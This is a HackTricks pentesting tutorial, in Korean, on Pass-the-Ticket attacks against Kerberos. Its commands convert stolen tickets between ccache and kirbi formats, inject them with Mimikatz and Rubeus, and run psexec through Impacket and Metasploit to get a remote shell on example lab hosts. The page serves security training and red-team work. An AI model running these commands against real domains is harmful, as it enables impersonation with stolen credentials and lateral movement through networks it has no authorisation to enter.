# Pass the Ticket

{{#include ../../banners/hacktricks-training.md}}

## 개요

Pass-the-Ticket(PtT) 공격에서 공격자는 탈취한 Kerberos ticket을 사용해 계정의 비밀번호를 알지 못해도 해당 ticket의 principal로 인증합니다. ticket-granting ticket(TGT)은 service ticket을 요청하는 데 사용할 수 있으며, 탈취한 service ticket은 대상 서비스와 유효 기간으로 사용이 제한됩니다.<sup>[[1]](#references)</sup>

ticket 획득 기법은 다음을 참조하세요.

- [Windows에서 ticket 수집](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-windows.md)
- [Linux에서 ticket 수집](../../network-services-pentesting/pentesting-kerberos-88/harvesting-tickets-from-linux.md)

## Linux 및 Windows Ticket 형식 변환

Kerberos cache는 일반적으로 Linux에서는 MIT `ccache` 파일로, Windows에서는 `.kirbi` 파일로 나타납니다. `ticket_converter`는 입력 ticket과 출력 경로를 사용해 이러한 형식 간 변환을 수행합니다.<sup>[[2]](#references)</sup>

```bash
python ticket_converter.py velociraptor.ccache velociraptor.kirbi
# Expected message: Converting ccache => kirbi
python ticket_converter.py velociraptor.kirbi velociraptor.ccache
# Expected message: Converting kirbi => ccache
```

Kekeo는 Windows에서 Kerberos ticket 도구도 제공합니다.<sup>[[3]](#references)</sup>

## 티켓 사용

Linux에서는 `KRB5CCNAME`을 캐시 경로로 지정하고, Impacket client가 password를 묻지 않고 Kerberos를 사용하도록 설정합니다:<sup>[[4]](#references)</sup>

```bash
export KRB5CCNAME=/root/impacket-examples/krb5cc_1120601113_ZFxZpK
python psexec.py jurassic.park/trex@labwws02.jurassic.park -k -no-pass
```

Windows에서 Mimikatz 또는 Rubeus를 사용해 `.kirbi` 티켓을 현재 로그온 세션으로 가져올 수 있습니다. 결과 캐시를 확인하려면 `klist`를 사용하세요.<sup>[[5]](#references)[[6]](#references)</sup>

```powershell
mimikatz.exe "kerberos::ptt [0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi"
.\Rubeus.exe ptt /ticket:'[0;28419fe]-2-1-40e00000-trex@krbtgt-JURASSIC.PARK.kirbi'
klist
.\PsExec.exe -accepteula \\lab-wdc01.jurassic.park cmd
```

Ticket을 가져와도 Ticket에 명시된 권한과 대상 서비스의 authorization policy를 넘어서는 권한은 부여되지 않습니다. 만료되었거나, 폐기되었거나, 형식이 잘못되었거나, 범위가 올바르게 설정되지 않은 Ticket은 작동하지 않을 수 있습니다.<sup>[[1]](#references)</sup>

Kerberos 공격의 전반적인 맥락과 관련 Ticket 획득 기법은 Tarlogic의 Kerberos 공격 가이드를 참조하세요.<sup>[[7]](#references)</sup>

### Metasploit에서 외부 Ticket 재사용하기

Metasploit은 Kerberos 모듈에서 Impacket의 `KRB5CCNAME`을 자동으로 읽지 않습니다. 프로토콜별 `::Krb5Ccname` 옵션을 통해 모듈에 **ccache 파일**을 지정하세요. `::Rhostname`에는 대상의 SPN hostname을, domain에는 대상 domain을 설정하세요. `RHOST`에는 계속 대상 IP를 사용할 수 있습니다. 이렇게 하면 계정 password를 입력하지 않고 이미 획득한 Ticket을 사용할 수 있습니다.<sup>[[8]](#references)</sup>

필요한 경우 먼저 `.kirbi`를 ccache로 변환하세요.<sup>[[9]](#references)</sup>

예를 들어, 대상에서 서비스를 생성할 수 있는 계정의 Ticket이 있다면 해당 cache를 사용해 [SMB PsExec module](../lateral-movement/psexec-and-winexec.md)을 실행하세요:<sup>[[8]](#references)[[9]](#references)[[10]](#references)</sup>

```text
use exploit/windows/smb/psexec
set RHOST 192.0.2.20
set SMBUser Administrator
set SMBDomain corp.example
set SMB::Auth kerberos
set SMB::Rhostname server.corp.example
set SMB::Krb5Ccname /path/to/administrator.ccache
set DomainControllerRhost 192.0.2.10
run
```

Metasploit은 제공된 캐시에서 일치하는 서비스 티켓을 먼저 선택합니다. TGT만 찾은 경우 KDC에 서비스 티켓을 요청하므로 이 경로에서도 DC 연결이 필요합니다. 서비스 티켓만 있는 캐시로는 관련 없는 다른 호스트에 접근할 수 없습니다. 지원되는 다른 모듈에서는 옵션 접두사를 변경하세요(예: [WinRM](../lateral-movement/winrm.md)의 경우 `Winrm::Krb5Ccname`).<sup>[[8]](#references)</sup>



## References

- [1] [MITRE ATT&CK T1550.003 - 티켓 전달](https://attack.mitre.org/techniques/T1550/003/)
- [2] [Zer1t0 - `ticket_converter`](https://github.com/Zer1t0/ticket_converter)
- [3] [gentilkiwi - Kekeo](https://github.com/gentilkiwi/kekeo)
- [4] [Fortra - Impacket 예제](https://github.com/fortra/impacket/tree/master/examples)
- [5] [gentilkiwi - Mimikatz](https://github.com/gentilkiwi/mimikatz)
- [6] [GhostPack - Rubeus](https://github.com/GhostPack/Rubeus)
- [7] [Tarlogic - Kerberos 공격 기법](https://www.tarlogic.com/blog/how-to-attack-kerberos/)
- [8] [Metasploit - 서비스 인증](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/service_authentication.html)
- [9] [Metasploit - kirbi 및 ccache 파일 변환](https://docs.metasploit.com/docs/pentesting/active-directory/kerberos/ticket_converter.html)
- [10] [Metasploit SMB 클라이언트 Kerberos 구현](https://github.com/rapid7/metasploit-framework/blob/master/lib/msf/core/exploit/remote/smb/client.rb)
{{#include ../../banners/hacktricks-training.md}}
